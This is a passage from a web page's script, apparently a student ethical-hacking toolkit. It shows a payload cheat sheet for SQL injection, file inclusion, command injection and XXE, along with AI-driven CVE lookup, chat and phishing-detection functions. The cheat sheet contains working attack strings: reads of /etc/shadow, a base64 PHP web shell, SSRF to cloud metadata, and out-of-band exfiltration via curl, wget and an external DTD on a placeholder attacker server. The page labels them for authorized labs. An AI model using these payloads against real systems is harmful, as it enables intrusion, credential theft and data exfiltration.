  ' OR 1=1 #
  admin' --
  ' OR 'x'='x

Union-based (find columns first):
  ' ORDER BY 1--
  ' ORDER BY 2--
  ' UNION SELECT NULL--
  ' UNION SELECT 1,2,3--
  ' UNION SELECT table_name,2 FROM information_schema.tables--

Error-based (MySQL):
  ' AND extractvalue(1,concat(0x7e,version()))--
  ' AND updatexml(1,concat(0x7e,user()),1)--

Time-based blind:
  ' AND SLEEP(5)--
  '; WAITFOR DELAY '0:0:5'-- (MSSQL)

⚠ Use only in authorized labs: DVWA, SQLi-Labs, HackTheBox`,

      lfi: `Local File Inclusion — Lab payloads
${'─'.repeat(38)}

Basic path traversal:
  ../../../etc/passwd
  ../../../../windows/system32/drivers/etc/hosts
  ../../boot.ini

URL encoded:
  ..%2F..%2F..%2Fetc%2Fpasswd
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

Double encoding:
  ..%252f..%252f..%252fetc%252fpasswd

Null byte (older PHP < 5.3):
  ../../../etc/passwd%00
  ../../../etc/passwd%00.jpg

PHP wrappers:
  php://filter/convert.base64-encode/resource=index.php
  php://input
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

Interesting files to read:
  /etc/passwd
  /etc/shadow
  /proc/self/environ
  /var/log/apache2/access.log (for log poisoning)

⚠ Use only in authorized labs`,

      cmd: `Command Injection — Lab payloads
${'─'.repeat(38)}

Linux chaining operators:
  ; ls -la
  | whoami
  && id
  || uname -a
  \`id\`
  $(whoami)

Blind (time-based):
  ; sleep 5
  | ping -c 5 127.0.0.1
  & timeout 5 (Windows)

Out-of-band:
  ; curl http://YOUR_SERVER/?data=$(whoami)
  ; wget http://YOUR_SERVER/?x=$(id)

Windows operators:
  & dir
  | ipconfig
  && whoami
  ; Get-Process (PowerShell)

Filter bypass:
  w'h'o'a'm'i
  w"h"o"a"m"i
  /bin/c'a't /etc/passwd

⚠ Use only in authorized labs`,

      xxe: `XXE (XML External Entity) — Lab payloads
${'─'.repeat(38)}

Basic file read:
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <foo>&xxe;</foo>

Windows file read:
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">

SSRF via XXE:
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

Blind XXE (out-of-band):
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd">
  %xxe;

PHP wrapper:
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

Error-based:
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?x=%file;'>">

⚠ Use only in authorized labs`
    };
    document.getElementById('payload-result').textContent = payloads[type] || '';
  }

  async function lookupCVE() {
    const cve = document.getElementById('cve-input').value.trim();
    const result = document.getElementById('cve-result');
    if (!cve) return;
    result.className = 'result-box loading';
    result.textContent = 'Looking up vulnerability...';
    try {
      const text = await askGemini(`Explain this CVE or vulnerability clearly for a cybersecurity student: "${cve}". Include: CVE ID, Vulnerability name/nickname, Affected software/systems, Severity and CVSS score, Year discovered, How it works (technical but accessible), Real-world impact, Patch/mitigation. Plain text only, structured format.`);
      result.className = 'result-box';
      result.textContent = text;
    } catch(e) {
      result.className = 'result-box';
      result.textContent = 'Error: Could not connect to AI. Check your API key.';
    }
  }

  async function sendChat() {
    const input = document.getElementById('ai-input');
    const chatArea = document.getElementById('chat-area');
    const msg = input.value.trim();
    if (!msg) return;
    input.value = '';
    const userMsg = document.createElement('div');
    userMsg.className = 'msg user';
    userMsg.textContent = msg;
    chatArea.appendChild(userMsg);
    const loadMsg = document.createElement('div');
    loadMsg.className = 'msg ai loading';
    loadMsg.textContent = 'Thinking...';
    chatArea.appendChild(loadMsg);
    chatArea.scrollTop = chatArea.scrollHeight;
    try {
      const text = await askGemini(`You are an expert cybersecurity assistant helping an ethical hacking student. Answer questions about ethical hacking, penetration testing, CTF challenges, security tools, certifications, and career advice. Always emphasize legal and ethical use only. Be concise, practical, and educational. Plain text only.\n\nUser question: ${msg}`);
      loadMsg.className = 'msg ai';
      loadMsg.textContent = text;
    } catch(e) {
      loadMsg.className = 'msg ai';
      loadMsg.textContent = 'Error: Could not connect to AI. Check your API key.';
    }
    chatArea.scrollTop = chatArea.scrollHeight;
  }

  let phishMode = 'url';

  function switchPhishTab(mode, btn) {
    phishMode = mode;
    document.querySelectorAll('#panel-phishing .tab-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    const hints = {
      url: 'Paste a suspicious URL or domain to check',
      email: 'Paste the full email content (subject, body, sender)',
      sms: 'Paste the suspicious SMS or WhatsApp message text'
    };
    const placeholders = {
      url: 'Paste suspicious URL here... e.g. http://paypa1-secure.xyz/login',
      email: 'Paste suspicious email content here...',
      sms: 'Paste suspicious SMS or WhatsApp message here...'
    };
    document.getElementById('phish-hint').textContent = hints[mode];
    document.getElementById('phish-input').placeholder = placeholders[mode];
    document.getElementById('phish-input').value = '';
    document.getElementById('phish-result').textContent = 'Paste content above to analyze it.';
    document.getElementById('risk-meter').style.display = 'none';
  }

  async function runPhishDetect() {
    const input = document.getElementById('phish-input').value.trim();
    const result = document.getElementById('phish-result');
    const meter = document.getElementById('risk-meter');
    const riskBar = document.getElementById('risk-bar');
    const riskLabel = document.getElementById('risk-label');
    if (!input) return;

    result.className = 'result-box loading';
    result.textContent = 'Analyzing for phishing indicators...';
    meter.style.display = 'none';

    const prompts = {
      url: `You are a cybersecurity expert specializing in phishing detection. Analyze this URL/domain for phishing and scam indicators: "${input}"

Check for: typosquatting, suspicious TLDs, misleading subdomains, URL shorteners hiding real destination, IP addresses instead of domains, excessive hyphens, brand impersonation, suspicious keywords (login, secure, verify, account, update, bank, paypal, etc).

Respond in this exact plain text format:
VERDICT: [SAFE / SUSPICIOUS / LIKELY PHISHING / PHISHING]
RISK SCORE: [0-100]
SUMMARY: [one sentence]

INDICATORS FOUND:
[list each red flag found, or "None detected" if safe]

EXPLANATION:
[2-3 sentences explaining your analysis]

RECOMMENDATION:
[what the user should do]`,

      email: `You are a cybersecurity expert specializing in email phishing detection. Analyze this email content for phishing and social engineering tactics: "${input}"

Check for: urgency/pressure tactics, requests for credentials or personal info, suspicious links, grammatical errors, impersonation of legitimate brands, too-good-to-be-true offers, threats, unusual sender patterns, spoofed domains.

Respond in this exact plain text format:
VERDICT: [SAFE / SUSPICIOUS / LIKELY PHISHING / PHISHING]
RISK SCORE: [0-100]
SUMMARY: [one sentence]

INDICATORS FOUND:
[list each red flag found, or "None detected" if safe]

TACTICS USED:
[social engineering tactics identified]

RECOMMENDATION:
[what the user should do]`,

      sms: `You are a cybersecurity expert specializing in SMS/WhatsApp scam detection (smishing). Analyze this message for scam indicators: "${input}"

Check for: prize/lottery scams, bank/OTP fraud, fake delivery notifications, impersonation of government/banks, suspicious links, urgency tactics, requests for money or personal info, too-good-to-be-true offers.

Respond in this exact plain text format:
VERDICT: [SAFE / SUSPICIOUS / LIKELY SCAM / SCAM]
RISK SCORE: [0-100]
SUMMARY: [one sentence]

INDICATORS FOUND:
[list each red flag found, or "None detected" if safe]

SCAM TYPE:
[type of scam if identified]

RECOMMENDATION:
[what the user should do]`
    };

    try {
      const text = await askGemini(prompts[phishMode]);

      // Extract risk score and verdict for meter
      const scoreMatch = text.match(/RISK SCORE:\s*(\d+)/i);
      const verdictMatch = text.match(/VERDICT:\s*(.+)/i);
      if (scoreMatch && verdictMatch) {
        const score = parseInt(scoreMatch[1]);
        const verdict = verdictMatch[1].trim();
        meter.style.display = 'block';
        riskBar.style.width = score + '%';
        const color = score >= 70 ? '#ff4444' : score >= 40 ? '#ffaa00' : '#00ff88';
        riskBar.style.background = color;
        riskLabel.style.color = color;
        riskLabel.textContent = verdict + ' — ' + score + '/100';
      }

      result.className = 'result-box';
      result.textContent = text;
    } catch(e) {
      result.className = 'result-box';
      result.textContent = 'Error: Could not connect to AI.\n\nMake sure your Anthropic API key is set in the script section of this file.';
    }
  }
</script>
</body>
</html>
